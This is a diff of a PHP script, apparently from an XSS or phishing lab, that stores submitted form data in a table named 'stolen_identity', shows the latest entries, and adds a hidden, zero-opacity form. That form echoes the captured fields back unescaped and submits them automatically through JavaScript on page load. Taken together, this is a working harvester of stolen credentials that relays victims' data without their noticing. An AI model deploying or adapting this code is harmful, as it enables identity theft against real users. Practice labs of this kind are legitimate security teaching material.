@@ -9,14 +9,19 @@ try {
 	$dsn = "pgsql:host=$db_host;port=5432;dbname=$db_name;";
 	$db = new PDO($dsn, $db_user, $db_password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
 
+	$template = 'show';
+
+	$data = NULL;
+
 	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 		$data = json_encode($_POST);
 		$referer = $_SERVER['HTTP_REFERER'];
 		$error = $db->prepare('INSERT INTO stolen_identity("data") VALUES (?)')
 			->execute([$data]);
 
-		header('HTTP/1.1 302 Found');
-		header("Location: $referer");
+		$template = 'redirect';
+#		header('HTTP/1.1 302 Found');
+#		header("Location: $referer");
 	}
 
 	$query = 'SELECT * FROM "stolen_identity" ORDER BY id DESC LIMIT 10';
@@ -31,6 +36,8 @@ try {
 }
 
 ?>
+
+<?php if($template === 'show'): ?>
 
 <!DOCTYPE html>
 <html>
@@ -61,3 +68,22 @@ try {
 </body>
 
 </html>
+
+<?php else: ?>
+
+<form action="/xss/comments/" method="post" style="opacity:0">
+	<?php foreach($_POST as $key => $value): ?>
+		<input name="<?= $key ?>" value="<?= $value ?>" type="hidden">
+	<?php endforeach; ?>
+	<input type="submit" id="submit">
+</form>
+
+<script>
+	window.onload = () => {
+		console.log('start');
+		document.getElementById('submit').click();
+		console.log('finish');
+	};
+</script>
+
+<?php endif; ?>
